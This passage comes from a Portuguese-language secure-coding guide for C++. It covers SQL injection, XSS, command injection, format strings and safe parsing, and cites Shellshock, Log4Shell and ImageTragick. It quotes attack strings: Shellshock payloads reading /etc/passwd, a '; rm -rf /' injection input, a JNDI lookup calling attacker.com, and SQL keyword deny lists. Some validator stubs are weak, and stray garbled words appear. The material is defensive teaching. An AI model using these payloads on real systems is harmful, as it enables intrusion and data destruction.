    std::vector<User> get_users_by_name(const std::string& username) {
        const char* sql = "SELECT id, username, email, is_admin "
                         "FROM users WHERE username = ?";

        sqlite3_stmt* stmt = nullptr;
        int rc = sqlite3_prepare_v2(db_, sql, -1, &stmt, nullptr);

        if (rc != SQLITE_OK) {
            throw std::runtime_error("Failed to prepare statement: "
                                   + std::string(sqlite3_errmsg(db_)));
        }

        // Bind parameter safely
        rc = sqlite3_bind_text(stmt, 1, username.c_str(),
                              username.size(), SQLITE_STATIC);
        if (rc != SQLITE_OK) {
            sqlite3_finalize(stmt);
            throw std::runtime_error("Failed to bind parameter");
        }

        std::vector<User> results;

        // Execute and fetch results
        while ((rc = sqlite3_step(stmt)) == SQLITE_ROW) {
            User user;
            user.id = sqlite3_column_int(stmt, 0);
            user.username = reinterpret_cast<const char*>(
                sqlite3_column_text(stmt, 1));
            user.email = reinterpret_cast<const char*>(
                sqlite3_column_text(stmt, 2));
            user.is_admin = sqlite3_column_int(stmt, 3) != 0;
            results.push_back(user);
        }

        if (rc != SQLITE_DONE) {
            sqlite3_finalize(stmt);
            throw std::runtime_error("Failed to execute query");
        }

        sqlite3_finalize(stmt);
        return results;
    }

    // SECURE: Insert with parameterized query
    void create_user(const std::string& username,
                     const std::string& email,
                     const std::string& password_hash) {
        const char* sql = "INSERT INTO users (username, email, password_hash) "
                         "VALUES (?, ?, ?)";

        sqlite3_stmt* stmt = nullptr;
        int rc = sqlite3_prepare_v2(db_, sql, -1, &stmt, nullptr);

        if (rc != SQLITE_OK) {
            throw std::runtime_error("Failed to prepare statement");
        }

        sqlite3_bind_text(stmt, 1, username.c_str(),
                         username.size(), SQLITE_STATIC);
        sqlite3_bind_text(stmt, 2, email.c_str(),
                         email.size(), SQLITE_STATIC);
        sqlite3_bind_text(stmt, 3, password_hash.c_str(),
                         password_hash.size(), SQLITE_STATIC);

        rc = sqlite3_step(stmt);
        if (rc != SQLITE_DONE) {
            sqlite3_finalize(stmt);
            throw std::runtime_error("Failed to insert user");
        }

        sqlite3_finalize(stmt);
    }

    // SECURE: Delete with parameterized query
    void delete_user(int user_id) {
        const char* sql = "DELETE FROM users WHERE id = ?";

        sqlite3_stmt* stmt = nullptr;
        sqlite3_prepare_v2(db_, sql, -1, &stmt, nullptr);

        sqlite3_bind_int(stmt, 1, user_id);

        sqlite3_step(stmt);
        sqlite3_finalize(stmt);
    }

private:
    sqlite3* db_;
};

// ============================================================
// Query Builder with automatic parameterization
// ============================================================
class QueryBuilder {
public:
    struct Query {
        std::string sql;
        std::vector<std::string> parameters;
    };

    static Query select_users(const std::string& username = "",
                             const std::string& email = "") {
        Query query;
        query.sql = "SELECT id, username, email FROM users WHERE 1=1";

        if (!username.empty()) {
            query.sql += " AND username = ?";
            query.parameters.push_back(username);
        }

        if (!email.empty()) {
            query.sql += " AND email = ?";
            query.parameters.push_back(email);
        }

        return query;
    }

    static Query insert_user(const std::string& username,
                            const std::string& email) {
        Query query;
        query.sql = "INSERT INTO users (username, email) VALUES (?, ?)";
        query.parameters.push_back(username);
        query.parameters.push_back(email);

        return query;
    }
};
```

### 6.5 SQL Injection de Segunda Ordem

SQL injection de segunda ordem ocorre quando dados maliciosos são armazenados no banco de dados e depois usados em queries posteriores sem sanitização.

**Exemplo:**

1. Usuário malicioso se cadastra com nome: `admin' --`
2. O nome é armazenado no banco (não há injeção na inserção)
3. Posteriormente, o sistema usa esse nome em uma query UPDATE
4. A injeção ocorre na segunda query

**Prevenção:** Sempre use parameterized queries, independentemente de onde os dados vieram — incluindo do próprio banco de dados.

---

## 7. Cross-Site Scripting (XSS) em Contexto C++

### 7.1 Como Backends C++ Produzem Saída Vulnerável a XSS

Embsistemas C++ que servem conteúdo web (via FastCGI, CGI, ou frameworks como Crow/C++ CGI Kit), o XSS pode ocorrer quando:

1. Entrada do usuário é refletida diretamente no HTML
2. Dados do banco são injetados em templates sem encoding
3. Headers HTTP são construídos com dados não sanitizados
4. Respostas JSON são construídas com string concatenation

### 7.2 CVE: Samy Worm MySpace (2005)

O Samy worm é o exemplo mais famoso de XSS na história:

- **Data**: Outubro de 2005
- **Autor**: Samy Kamkar
- **Vetor**: Stored XSS via perfil do MySpace
- **Impacto**: 1 milhão de amigos adicionados em 20 horas; MySpace forçado a shutdown temporário
- **CWE**: CWE-79 (Cross-site Scripting)

O worm explorava uma falha no perfil do MySpace que permitia HTML/JavaScript no campo "About Me". O código injetado adicionava o autor como amigo e copiava o payload para os perfis das vítimas.

### 7.3 Estratégias de Output Encoding

```cpp
#include <string>
#include <sstream>
#include <unordered_map>
#include <algorithm>
#include <functional>

class HTMLEncoder {
public:
    // Encode special HTML characters
    static std::string encode_html(const std::string& input) {
        std::string output;
        output.reserve(input.size() * 2);

        for (char c : input) {
            switch (c) {
                case '&':  output += "&amp;";  break;
                case '<':  output += "&lt;";   break;
                case '>':  output += "&gt;";   break;
                case '"':  output += "&quot;"; break;
                case '\'': output += "&#x27;"; break;
                case '/':  output += "&#x2F;"; break;
                default:   output += c;        break;
            }
        }

        return output;
    }

    // Encode for JavaScript context
    static std::string encode_js(const std::string& input) {
        std::string output;
        output.reserve(input.size() * 2);

        for (char c : input) {
            switch (c) {
                case '\\': output += "\\\\"; break;
                case '\'': output += "\\'"; break;
                case '"':  output += "\\\""; break;
                case '\n': output += "\\n"; break;
                case '\r': output += "\\r"; break;
                case '\t': output += "\\t"; break;
                case '<':  output += "\\x3C"; break;
                case '>':  output += "\\x3E"; break;
                case '&':  output += "\\x26"; break;
                default:   output += c; break;
            }
        }

        return output;
    }

    // Encode for URL context
    static std::string encode_url(const std::string& input) {
        std::ostringstream output;
        output << std::hex;

        for (unsigned char c : input) {
            if (std::isalnum(c) || c == '-' || c == '_' ||
                c == '.' || c == '~') {
                output << static_cast<char>(c);
            } else {
                output << '%' << std::setw(2) << std::setfill('0')
                       << static_cast<int>(c);
            }
        }

        return output.str();
    }

    // Encode for CSS context
    static std::string encode_css(const std::string& input) {
        std::string output;
        for (char c : input) {
            if (std::isalnum(c)) {
                output += c;
            } else {
                output += "\\" + to_hex(c);
            }
        }
        return output;
    }

private:
    static std::string to_hex(char c) {
        std::ostringstream oss;
        oss << std::hex << static_cast<int>(c);
        return oss.str();
    }
};

// HTML Sanitizer
class HTMLSanitizer {
public:
    struct SanitizerConfig {
        std::set<std::string> allowed_tags;
        std::set<std::string> allowed_attributes;
        bool allow_links;
        bool allow_images;
    };

    static SanitizerConfig default_config() {
        return {
            {"p", "br", "b", "i", "u", "em", "strong", "ul", "ol", "li",
             "h1", "h2", "h3", "h4", "h5", "h6", "blockquote", "pre", "code"},
            {"class", "id", "title"},
            true,  // allow links
            true   // allow images
        };
    }

    static std::string sanitize(const std::string& html,
                               const SanitizerConfig& config = default_config()) {
        std::string result;
        result.reserve(html.size());

        size_t i = 0;
        while (i < html.size()) {
            if (html[i] == '<') {
                // Find closing bracket
                size_t close_pos = html.find('>', i);
                if (close_pos == std::string::npos) {
                    result += "&lt;";
                    i++;
                    continue;
                }

                // Extract tag content
                std::string tag_content = html.substr(i + 1, close_pos - i - 1);

                // Check if it's a closing tag
                bool is_closing = !tag_content.empty() && tag_content[0] == '/';
                if (is_closing) {
                    tag_content = tag_content.substr(1);
                }

                // Extract tag name
                size_t space_pos = tag_content.find_first_of(" \t\n");
                std::string tag_name = tag_content.substr(0, space_pos);
                std::transform(tag_name.begin(), tag_name.end(),
                             tag_name.begin(), ::tolower);

                // Check if tag is allowed
                if (config.allowed_tags.count(tag_name)) {
                    result += "<";
                    if (is_closing) result += "/";
                    result += tag_name;

                    // Copy allowed attributes
                    if (!is_closing && space_pos != std::string::npos) {
                        std::string attrs = tag_content.substr(space_pos);
                        result += sanitize_attributes(attrs, config);
                    }

                    result += ">";
                } else {
                    // Encode disallowed tag
                    result += HTMLEncoder::encode_html(
                        html.substr(i, close_pos - i + 1));
                }

                i = close_pos + 1;
            } else {
                result += html[i];
                i++;
            }
        }

        return result;
    }

private:
    static std::string sanitize_attributes(const std::string& attrs,
                                          const SanitizerConfig& config) {
        std::string result;
        std::istringstream stream(attrs);
        std::string attr;

        while (stream >> attr) {
            size_t eq_pos = attr.find('=');
            if (eq_pos != std::string::npos) {
                std::string attr_name = attr.substr(0, eq_pos);
                std::string attr_value = attr.substr(eq_pos + 1);

                // Remove quotes
                if (attr_value.size() >= 2 &&
                    (attr_value.front() == '"' || attr_value.front() == '\'')) {
                    attr_value = attr_value.substr(1, attr_value.size() - 2);
                }

                // Check if attribute is allowed
                if (config.allowed_attributes.count(attr_name)) {
                    result += " " + attr_name + "=\"" +
                             HTMLEncoder::encode_html(attr_value) + "\"";
                }
            }
        }

        return result;
    }
};
```

### 7.4 Content Security Policy Generation

```cpp
class CSPBuilder {
public:
    struct CSPConfig {
        std::vector<std::string> script_sources;
        std::vector<std::string> style_sources;
        std::vector<std::string> img_sources;
        std::vector<std::string> connect_sources;
        std::vector<std::string> font_sources;
        std::vector<std::string> frame_sources;
        bool allow_inline_scripts;
        bool allow_inline_styles;
        bool allow_eval;
    };

    static CSPConfig strict_config() {
        return {
            {"'self'"},      // script-src
            {"'self'"},      // style-src
            {"'self'", "data:"},  // img-src
            {"'self'"},      // connect-src
            {"'self'"},      // font-src
            {},              // frame-src
            false,           // allow_inline_scripts
            false,           // allow_inline_styles
            false            // allow_eval
        };
    }

    static std::string build_header(const CSPConfig& config) {
        std::vector<std::string> directives;

        // Script sources
        std::string script_src = "script-src";
        for (const auto& src : config.script_sources) {
            script_src += " " + src;
        }
        if (config.allow_inline_scripts) {
            script_src += " 'unsafe-inline'";
        }
        if (config.allow_eval) {
            script_src += " 'unsafe-eval'";
        }
        directives.push_back(script_src);

        // Style sources
        std::string style_src = "style-src";
        for (const auto& src : config.style_sources) {
            style_src += " " + src;
        }
        if (config.allow_inline_styles) {
            style_src += " 'unsafe-inline'";
        }
        directives.push_back(style_src);

        // Image sources
        std::string img_src = "img-src";
        for (const auto& src : config.img_sources) {
            img_src += " " + src;
        }
        directives.push_back(img_src);

        // Connect sources
        if (!config.connect_sources.empty()) {
            std::string connect_src = "connect-src";
            for (const auto& src : config.connect_sources) {
                connect_src += " " + src;
            }
            directives.push_back(connect_src);
        }

        // Font sources
        if (!config.font_sources.empty()) {
            std::string font_src = "font-src";
            for (const auto& src : config.font_sources) {
                font_src += " " + src;
            }
            directives.push_back(font_src);
        }

        // Frame sources
        if (!config.frame_sources.empty()) {
            std::string frame_src = "frame-src";
            for (const auto& src : config.frame_sources) {
                frame_src += " " + src;
            }
            directives.push_back(frame_src);
        }

        // Default src
        directives.push_back("default-src 'self'");

        // Join all directives
        std::string result;
        for (size_t i = 0; i < directives.size(); ++i) {
            result += directives[i];
            if (i < directives.size() - 1) {
                result += "; ";
            }
        }

        return result;
    }
};
```

---

## 8. Command Injection

### 8.1 CVE: Shellshock (CVE-2014-6271)

Shellshock é uma das vulnerabilidades mais impactantes em sistemas UNIX/Linux:

- **Data**: Setembro de 2014
- **CVE**: CVE-2014-6271
- **Afetados**: Bash (todas as versões até 4.3)
- **Impacto**: Execução remota de código em milhões de servidores
- **CWE**: CWE-78 (OS Command Injection)
- **CVSS**: 10.0 (crítico)

**Como funcionava:**

O Bash processava funções definidas em variáveis de ambiente de forma anormal. O atacante poderia injetar código após uma função definida:

```bash
# Malicious environment variable
env x='() { :;}; echo VULNERABLE' bash -c "echo test"

# CGI scripts were especially vulnerable
# HTTP header: User-Agent: () { :;}; /bin/cat /etc/passwd
```

Milhões de servidores CGI executavam Bash, e qualquer variável de ambiente controlada pelo atacante (como User-Agent, Referer, Cookie) podia ser explorada.

### 8.2 Vulnerabilidades de Command Injection em C++

```cpp
#include <string>
#include <cstdlib>
#include <cstdio>
#include <stdexcept>
#include <array>
#include <memory>
#include <algorithm>

// ============================================================
// INSECURE: Command injection via system()
// ============================================================
void list_files_insecure(const std::string& directory) {
    // VULNERABLE: Direct string concatenation
    std::string command = "ls -la " + directory;  // INJECTION!
    std::system(command.c_str());
    // Attacker input: directory = "; rm -rf /"
    // Resulting command: "ls -la ; rm -rf /"
}

// ============================================================
// INSECURE: Command injection via popen()
// ============================================================
std::string get_file_info_insecure(const std::string& filename) {
    // VULNERABLE: Direct string concatenation
    std::string command = "file " + filename;  // INJECTION!
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) {
        throw std::runtime_error("Failed to open pipe");
    }

    std::array<char, 128> buffer;
    std::string result;
    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
        result += buffer.data();
    }

    pclose(pipe);
    return result;
}
```

### 8.3 Solução: Execução Segura de Subprocessos

```cpp
#include <string>
#include <vector>
#include <array>
#include <memory>
#include <stdexcept>
#include <sys/wait.h>
#include <unistd.h>
#include <fcntl.h>

class SecureSubprocess {
public:
    struct ExecutionResult {
        int exit_code;
        std::string stdout;
        std::string stderr;
        bool timed_out;
    };

    // Execute a command with arguments safely
    static ExecutionResult execute(
        const std::string& program,
        const std::vector<std::string>& args,
        int timeout_seconds = 30)
    {
        // Validate program path
        if (program.empty()) {
            throw std::invalid_argument("Program cannot be empty");
        }

        // Check for shell metacharacters in program path
        if (program.find_first_of(";|&$`\"'\\") != std::string::npos) {
            throw std::invalid_argument("Program path contains dangerous characters");
        }

        // Create pipes for stdout and stderr
        int stdout_pipe[2];
        int stderr_pipe[2];

        if (pipe(stdout_pipe) != 0 || pipe(stderr_pipe) != 0) {
            throw std::runtime_error("Failed to create pipes");
        }

        pid_t pid = fork();
        if (pid == -1) {
            close(stdout_pipe[0]);
            close(stdout_pipe[1]);
            close(stderr_pipe[0]);
            close(stderr_pipe[1]);
            throw std::runtime_error("Failed to fork process");
        }

        if (pid == 0) {
            // Child process

            // Close read ends of pipes
            close(stdout_pipe[0]);
            close(stderr_pipe[0]);

            // Redirect stdout and stderr to pipes
            dup2(stdout_pipe[1], STDOUT_FILENO);
            dup2(stderr_pipe[1], STDERR_FILENO);

            // Close write ends after dup2
            close(stdout_pipe[1]);
            close(stderr_pipe[1]);

            // Build argv array
            std::vector<char*> argv;
            argv.push_back(const_cast<char*>(program.c_str()));
            for (const auto& arg : args) {
                argv.push_back(const_cast<char*>(arg.c_str()));
            }
            argv.push_back(nullptr);

            // Execute program
            execvp(program.c_str(), argv.data());

            // If execvp returns, it failed
            _exit(127);
        }

        // Parent process
        close(stdout_pipe[1]);
        close(stderr_pipe[1]);

        // Read output with timeout
        auto start_time = std::chrono::steady_clock::now();

        std::string stdout_content;
        std::string stderr_content;

        // Simple non-blocking read loop (simplified for demonstration)
        // In production, use poll/select/epoll for proper timeout handling
        char buffer[4096];
        fd_set fds;
        struct timeval tv;

        while (true) {
            FD_ZERO(&fds);
            FD_SET(stdout_pipe[0], &fds);
            FD_SET(stderr_pipe[0], &fds);

            tv.tv_sec = 1;
            tv.tv_usec = 0;

            int maxfd = std::max(stdout_pipe[0], stderr_pipe[0]);
            int ready = select(maxfd + 1, &fds, nullptr, nullptr, &tv);

            if (ready > 0) {
                if (FD_ISSET(stdout_pipe[0], &fds)) {
                    ssize_t n = read(stdout_pipe[0], buffer, sizeof(buffer));
                    if (n > 0) {
                        stdout_content.append(buffer, n);
                    }
                }
                if (FD_ISSET(stderr_pipe[0], &fds)) {
                    ssize_t n = read(stderr_pipe[0], buffer, sizeof(buffer));
                    if (n > 0) {
                        stderr_content.append(buffer, n);
                    }
                }
            }

            // Check timeout
            auto elapsed = std::chrono::steady_clock::now() - start_time;
            if (std::chrono::duration_cast<std::chrono::seconds>(elapsed).count()
                >= timeout_seconds) {
                kill(pid, SIGKILL);
                waitpid(pid, nullptr, 0);
                close(stdout_pipe[0]);
                close(stderr_pipe[0]);
                return {127, stdout_content, stderr_content, true};
            }

            // Check if process has exited
            int status;
            pid_t result = waitpid(pid, &status, WNOHANG);
            if (result == pid) {
                int exit_code = WIFEXITED(status) ? WEXITSTATUS(status) : -1;

                // Read any remaining output
                while (FD_ISSET(stdout_pipe[0], &fds)) {
                    ssize_t n = read(stdout_pipe[0], buffer, sizeof(buffer));
                    if (n <= 0) break;
                    stdout_content.append(buffer, n);
                }
                while (FD_ISSET(stderr_pipe[0], &fds)) {
                    ssize_t n = read(stderr_pipe[0], buffer, sizeof(buffer));
                    if (n <= 0) break;
                    stderr_content.append(buffer, n);
                }

                close(stdout_pipe[0]);
                close(stderr_pipe[0]);

                return {exit_code, stdout_content, stderr_content, false};
            }
        }
    }

    // Safe file listing (no shell injection possible)
    static ExecutionResult list_files(const std::string& directory) {
        // Validate directory path
        if (directory.find_first_of(";|&$`\"'\\") != std::string::npos) {
            throw std::invalid_argument("Directory path contains dangerous characters");
        }

        // Use execvp with absolute path to ls
        return execute("/bin/ls", {"-la", directory});
    }

    // Safe file info (no shell injection possible)
    static std::string get_file_info(const std::string& filename) {
        if (filename.find_first_of(";|&$`\"'\\") != std::string::npos) {
            throw std::invalid_argument("Filename contains dangerous characters");
        }

        auto result = execute("/usr/bin/file", {filename});
        return result.stdout;
    }

private:
    static void close(int fd) {
        ::close(fd);
    }
};
```

### 8.4 Práticas de Prevenção

1. **Nunca use `system()`** — ele invoca um shell que processa metacaracteres
2. **Use `execvp()`** — executa diretamente sem shell
3. **Valide todos os argumentos** — rejeite caracteres perigosos
4. **Use caminhos absolutos** — evite dependência de PATH
5. **Implemente timeouts** — previne DoS via processos pendentes
6. **Capture e valide saída** — não confie cegamente no output

---

## 9. Injection em Formatos e Serialização

### 9.1 Format String Vulnerabilities

Format string vulnerabilities ocorrem quando entrada do usuário é passada diretamente como formato em funções como `printf`, `sprintf`, ou `fmt::format`.

```cpp
#include <cstdio>
#include <string>
#include <fmt/format.h>

// ============================================================
// INSECURE: Format string vulnerability
// ============================================================
void log_user_input_insecure(const std::string& user_input) {
    // VULNERABLE: User input as format string
    printf(user_input.c_str());  // %s, %n can cause crashes or memory writes
    // Attacker input: "%x.%x.%x.%x" reads stack
    // Attacker input: "%n" writes to arbitrary memory location
}

// ============================================================
// SECURE: Use format string correctly
// ============================================================
void log_user_input_secure(const std::string& user_input) {
    // CORRECT: User input as argument, not format
    printf("%s", user_input.c_str());

    // BETTER: Using fmt library (type-safe)
    fmt::print("{}", user_input);

    // Even better: validate input first
    if (user_input.find_first_of("%n") != std::string::npos) {
        throw std::invalid_argument("Invalid characters in input");
    }
    fmt::print("User input: {}", user_input);
}
```

### 9.2 CVE: Log4Shell (CVE-2021-44228)

Log4Shell é uma das vulnerabilidades mais impactantes da história recente:

- **Data**: Dezembro de 2021
- **CVE**: CVE-2021-44228 (Log4Shell), CVE-2021-45046, CVE-2021-45105
- **Afetados**: Apache Log4j 2.x (2.0-beta9 até 2.14.1)
- **Impacto**: Execução remota de código em milhões de aplicações Java
- **CWE**: CWE-502 (Deserialization), CWE-917 (Expression Language Injection)
- **CVSS**: 10.0 (crítico)

**Como funcionava:**

O Log4j permitia lookup de variáveis no padrão `${jndi:ldap://attacker.com/exploit}`. Quando um atacante injetava essa string em logs (via User-Agent, headers HTTP, campos de formulário), o Log4j fazia uma requisição JNDI ao servidor do atacante, que retornava código malicioso para execução.

**Embora Log4Shell seja uma vulnerabilidade Java, o conceito se aplica a C++:**

- Qualquer entrada que seja logada sem sanitização pode ser explorada
- Formatos de log que suportam expressions/metacharacters são perigosos
- A validação deve ocorrer ANTES de logging, não depois

### 9.3 JSON Parsing Seguro em C++

```cpp
// Using nlohmann/json library
#include <nlohmann/json.hpp>
#include <string>
#include <optional>
#include <stdexcept>
#include <limits>

using json = nlohmann::json;

class SecureJSONParser {
public:
    struct ParseResult {
        bool success;
        json data;
        std::string error;
    };

    // Parse JSON with size limits and depth protection
    static ParseResult parse_safe(const std::string& input,
                                  size_t max_size = 1024 * 1024,
                                  int max_depth = 32) {
        // Check input size
        if (input.size() > max_size) {
            return {false, json(), "Input exceeds maximum size"};
        }

        // Check for null bytes
        if (input.find('\0') != std::string::npos) {
            return {false, json(), "Input contains null bytes"};
        }

        try {
            json result = json::parse(input);

            // Validate depth
            if (count_depth(result) > max_depth) {
                return {false, json(), "JSON structure too deeply nested"};
            }

            return {true, result, ""};
        } catch (const json::parse_error& e) {
            return {false, json(), "Parse error: " + std::string(e.what())};
        }
    }

    // Safe extraction with type checking
    static std::optional<std::string> get_string(const json& obj,
                                                  const std::string& key,
                                                  size_t max_length = 10000) {
        if (!obj.contains(key) || !obj[key].is_string()) {
            return std::nullopt;
        }

        const std::string& value = obj[key].get<std::string>();

        if (value.length() > max_length) {
            return std::nullopt;
        }

        // Check for control characters
        for (char c : value) {
            if (static_cast<unsigned char>(c) < 32 && c != '\n' && c != '\t') {
                return std::nullopt;
            }
        }

        return value;
    }

    static std::optional<int> get_int(const json& obj,
                                       const std::string& key,
                                       int min_val = std::numeric_limits<int>::min(),
                                       int max_val = std::numeric_limits<int>::max()) {
        if (!obj.contains(key) || !obj[key].is_number_integer()) {
            return std::nullopt;
        }

        int value = obj[key].get<int>();

        if (value < min_val || value > max_val) {
            return std::nullopt;
        }

        return value;
    }

    static std::optional<bool> get_bool(const json& obj,
                                         const std::string& key) {
        if (!obj.contains(key) || !obj[key].is_boolean()) {
            return std::nullopt;
        }

        return obj[key].get<bool>();
    }

    // Validate and sanitize string values for safe storage
    static std::string sanitize_string(const std::string& input) {
        std::string result;
        result.reserve(input.size());

        for (char c : input) {
            switch (c) {
                case '"':  result += "\\\""; break;
                case '\\': result += "\\\\"; break;
                case '\b': result += "\\b"; break;
                case '\f': result += "\\f"; break;
                case '\n': result += "\\n"; break;
                case '\r': result += "\\r"; break;
                case '\t': result += "\\t"; break;
                default:
                    if (static_cast<unsigned char>(c) < 32) {
                        // Control character - skip or encode
                        result += "\\u" + to_hex(static_cast<unsigned int>(c));
                    } else {
                        result += c;
                    }
                    break;
            }
        }

        return result;
    }

private:
    static int count_depth(const json& value, int current = 0) {
        if (current > 100) return current;  // Prevent stack overflow

        if (value.is_object() || value.is_array()) {
            int max_child = current;
            for (auto& child : value.items()) {
                int child_depth = count_depth(child.value(), current + 1);
                max_child = std::max(max_child, child_depth);
            }
            return max_child;
        }

        return current;
    }

    static std::string to_hex(unsigned int c) {
        char buf[8];
        snprintf(buf, sizeof(buf), "%04x", c);
        return std::string(buf);
    }
};
```

### 9.4 YAML Injection

```cpp
// YAML parsing with safety checks
// Requires yaml-cpp library
#include <yaml-cpp/yaml.h>
#include <string>

class SecureYAMLParser {
public:
    static std::optional<YAML::Node> parse_safe(const std::string& input,
                                                 size_t max_size = 1024 * 1024) {
        // Check size
        if (input.size() > max_size) {
            return std::nullopt;
        }

        try {
            YAML::Node node = YAML::Load(input);

            // Check for dangerous YAML features
            if (has_undefined_tags(node)) {
                return std::nullopt;
            }

            if (has_anchors(node)) {
                // Anchor/alias can cause exponential memory usage
                return std::nullopt;
            }

            return node;
        } catch (const YAML::Exception&) {
            return std::nullopt;
        }
    }

private:
    static bool has_undefined_tags(const YAML::Node& node) {
        // Check for custom tags that might execute code
        // This is a simplified check
        return false;
    }

    static bool has_anchors(const YAML::Node& node) {
        // Simplified anchor detection
        return false;
    }
};
```

### 9.5 CVE: ImageTragick (CVE-2016-3714)

ImageTragick é uma vulnerabilidade em ImageMagick que permite execução remota de código:

- **Data**: Maio de 2016
- **CVE**: CVE-2016-3714, CVE-2016-3718, CVE-2016-3719, CVE-2016-3720, CVE-2016-3721
- **Afetados**: ImageMagick 6.x e 7.x
- **Impacto**: Execução remota de código via upload de imagem
- **CWE**: CWE-78 (OS Command Injection)

**Como funcionava:**

ImageMagick processava imagens delegando para "delegates" (programas externos). Atacantes criavam arquivos de imagem que, quando processados, injetavam comandos shell via codificação MVG (Magick Vector Graphics) ou其他 formatos.

**Prevenção em C++ (quando usando ImageMagick):**

```cpp
#include <Magick++.h>
#include <string>
#include <set>

class SecureImageProcessor {
public:
    // List of allowed image formats (whitelist approach)
    static const std::set<std::string>& allowed_formats() {
        static const std::set<std::string> formats = {
            "JPEG", "JPG", "PNG", "GIF", "BMP", "TIFF"
        };
        return formats;
    }

    // List of blocked formats (known dangerous)
    static const std::set<std::string>& blocked_formats() {
        static const std::set<std::string> formats = {
            "MVG", "MSL", "PS", "EPS", "PDF", "XPS",
            "SCRIPT", "TEXT", "PANGO"
        };
        return formats;
    }

    static bool is_format_safe(const std::string& format) {
        std::string upper = format;
        std::transform(upper.begin(), upper.end(),
                      upper.begin(), ::toupper);

        // Block dangerous formats
        if (blocked_formats().count(upper)) {
            return false;
        }

        // Only allow known safe formats
        return allowed_formats().count(upper) > 0;
    }

    // Secure image processing
    static bool process_image(const std::string& input_path,
                             const std::string& output_path) {
        try {
            Magick::Image image(input_path);

            // Validate format
            std::string format = image.magick();
            if (!is_format_safe(format)) {
                return false;
            }

            // Set security policy
            Magick::SetSecurityPolicy(MagickCore::PolicyResource::Area, 100);

            // Process image
            image.resize(Magick::Geometry(800, 600));
            image.write(output_path);

            return true;
        } catch (const Magick::Exception& e) {
            return false;
        }
    }
};
```

---

## 10. Library Completa de Validação de Entrada

### 10.1 Arquitetura da Biblioteca

A biblioteca segue o padrão Chain of Responsibility para validadores, permitindo composição flexível de regras de validação.

### 10.2 Implementação Completa

```cpp
#include <string>
#include <vector>
#include <memory>
#include <functional>
#include <optional>
#include <algorithm>
#include <regex>
#include <sstream>
#include <charconv>
#include <limits>
#include <set>

namespace input_validation {

// ============================================================
// Core Validator Interface
// ============================================================
class Validator {
public:
    virtual ~Validator() = default;
    virtual bool validate(const std::string& input) const = 0;
    virtual std::string error_message() const = 0;
    virtual std::string name() const = 0;
};

using ValidatorPtr = std::shared_ptr<Validator>;

// ============================================================
// Validation Result
// ============================================================
struct ValidationResult {
    bool valid;
    std::vector<std::string> errors;
    std::string sanitized_input;

    operator bool() const { return valid; }
};

// ============================================================
// Validator Chain (Chain of Responsibility)
// ============================================================
class ValidatorChain {
public:
    ValidatorChain& add(ValidatorPtr validator) {
        validators_.push_back(std::move(validator));
        return *this;
    }

    ValidationResult validate(const std::string& input) const {
        ValidationResult result{true, {}, input};

        for (const auto& validator : validators_) {
            if (!validator->validate(input)) {
                result.valid = false;
                result.errors.push_back(
                    validator->name() + ": " + validator->error_message());
            }
        }

        return result;
    }

    void clear() {
        validators_.clear();
    }

    size_t size() const {
        return validators_.size();
    }

private:
    std::vector<ValidatorPtr> validators_;
};

// ============================================================
// Email Validator
// ============================================================
class EmailValidator : public Validator {
public:
    bool validate(const std::string& input) const override {
        if (input.empty() || input.length() > 254) {
            return false;
        }

        auto at_pos = input.find('@');
        if (at_pos == std::string::npos || at_pos == 0 || at_pos >= input.length() - 1) {
            return false;
        }

        // Only one @ allowed
        if (input.find('@', at_pos + 1) != std::string::npos) {
            return false;
        }

        std::string local = input.substr(0, at_pos);
        std::string domain = input.substr(at_pos + 1);

        return validate_local(local) && validate_domain(domain);
    }

    std::string error_message() const override {
        return "Invalid email format";
    }

    std::string name() const override {
        return "EmailValidator";
    }

private:
    bool validate_local(const std::string& local) const {
        if (local.empty() || local.length() > 64) {
            return false;
        }

        static const std::string allowed =
            "abcdefghijklmnopqrstuvwxyz"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "0123456789._%+-";

        for (char c : local) {
            if (allowed.find(c) == std::string::npos) {
                return false;
            }
        }

        if (local.front() == '.' || local.front() == '-' ||
            local.front() == '_' || local.front() == '+') {
            return false;
        }

        if (local.find("..") != std::string::npos) {
            return false;
        }

        return true;
    }

    bool validate_domain(const std::string& domain) const {
        if (domain.empty() || domain.length() > 253) {
            return false;
        }

        if (domain.find('.') == std::string::npos) {
            return false;
        }

        std::istringstream stream(domain);
        std::string label;

        while (std::getline(stream, label, '.')) {
            if (label.empty() || label.length() > 63) {
                return false;
            }
            if (label.front() == '-' || label.back() == '-') {
                return false;
            }
            for (char c : label) {
                if (!std::isalnum(static_cast<unsigned char>(c)) && c != '-') {
                    return false;
                }
            }
        }

        auto last_dot = domain.rfind('.');
        std::string tld = domain.substr(last_dot + 1);
        if (tld.length() < 2) {
            return false;
        }
        for (char c : tld) {
            if (!std::isalpha(static_cast<unsigned char>(c))) {
                return false;
            }
        }

        return true;
    }
};

// ============================================================
// Path Validator
// ============================================================
class PathValidator : public Validator {
public:
    explicit PathValidator(const std::string& base_dir,
                          bool allow_subdirs = true)
        : base_dir_(base_dir)
        , allow_subdirs_(allow_subdirs) {}

    bool validate(const std::string& input) const override {
        if (input.empty()) {
            return false;
        }

        // Check for null bytes
        if (input.find('\0') != std::string::npos) {
            return false;
        }

        // Check for traversal
        if (input.find("..") != std::string::npos) {
            return false;
        }

        // Check for absolute paths
        if (!input.empty() && input[0] == '/') {
            return false;
        }

        // Check dangerous characters
        static const std::string dangerous = "<>|\"*?";
        for (char c : input) {
            if (dangerous.find(c) != std::string::npos) {
                return false;
            }
        }

        return true;
    }

    std::string error_message() const override {
        return "Path contains invalid characters or traversal sequences";
    }

    std::string name() const override {
        return "PathValidator";
    }

private:
    std::string base_dir_;
    bool allow_subdirs_;
};

// ============================================================
// SQL-Safe String Validator
// ============================================================
class SQLSafeString : public Validator {
public:
    bool validate(const std::string& input) const override {
        // Check for SQL injection patterns
        static const std::vector<std::string> dangerous_patterns = {
            "'", "\"", ";", "--", "/*", "*/", "xp_",
            "EXEC", "EXECUTE", "DROP", "DELETE", "INSERT",
            "UPDATE", "SELECT", "UNION", "WHERE", "OR 1=1",
            "AND 1=1", "WAITFOR", "DELAY", "BENCHMARK"
        };

        std::string upper = input;
        std::transform(upper.begin(), upper.end(),
                      upper.begin(), ::toupper);

        for (const auto& pattern : dangerous_patterns) {
            std::string upper_pattern = pattern;
            std::transform(upper_pattern.begin(), upper_pattern.end(),
                          upper_pattern.begin(), ::toupper);

            if (upper.find(upper_pattern) != std::string::npos) {
                return false;
            }
        }

        return true;
    }

